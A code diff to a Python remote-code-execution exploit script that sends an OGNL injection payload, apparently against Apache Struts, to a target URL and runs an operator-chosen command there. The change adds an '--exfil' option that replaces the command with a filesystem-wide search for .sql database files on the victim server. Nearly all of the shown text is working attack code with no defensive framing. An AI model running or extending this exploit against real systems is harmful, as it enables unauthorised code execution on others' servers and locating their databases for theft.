@@ -18,11 +18,16 @@ p = optparse.OptionParser(usage=base64.b64decode(data01))
 p.add_option('-u', '--url', action="store", default=None, dest="url", type="string", help="Target URL")
 p.add_option('-c', '--cmd', action="store", default=None, dest="cmd", type="string", help="RCE Command")
 p.add_option('-a', '--uaf', action="store", default=None, dest="uaf", type="string", help="Custom User-Agent File")
+p.add_option('--exfil',     action="store_true", default=False, dest="exf", help="(optional) Find Databases")
 (option, arg) = p.parse_args()
 
 url = option.url if option.url else None
 cmd = option.cmd if option.cmd else 'id'
 uaf = option.uaf if option.uaf else 'user-agents.txt'
+exf = option.exf if option.exf else False
+
+if exf:
+    cmd = "find / -type f -name \"*.sql\" -print"
 
 def intro():
 	print("")
@@ -47,7 +52,9 @@ def parse_url(url):
 
 def exploit(url, cmd):
     url = parse_url(url)
+         
     to = 15 #timeout in seconds
+       
     payload = "%{(#_='multipart/form-data')."
     payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
     payload += "(#_memberAccess?"
